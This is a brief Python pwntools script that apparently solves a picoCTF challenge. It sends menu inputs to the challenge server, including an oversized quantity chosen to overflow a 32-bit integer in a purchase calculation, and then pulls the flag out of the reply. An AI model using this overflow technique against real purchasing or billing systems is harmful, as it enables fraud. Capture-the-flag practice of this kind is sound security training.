from pwn import remote
import re

url, port = "jupiter.challenges.picoctf.org", 4906
amount = bytes(str(int(((1 << 31)//900)*1.5)), 'utf')
inputs = [b'2', b'1', amount, b'2', b'2', b'1']
r = remote(url, port)
list(map(r.sendline, inputs))
lol = r.recvregex(rb'picoCTF{.*?}').decode()
flag = re.findall(r'picoCTF{.*?}', lol)[0]
print(flag)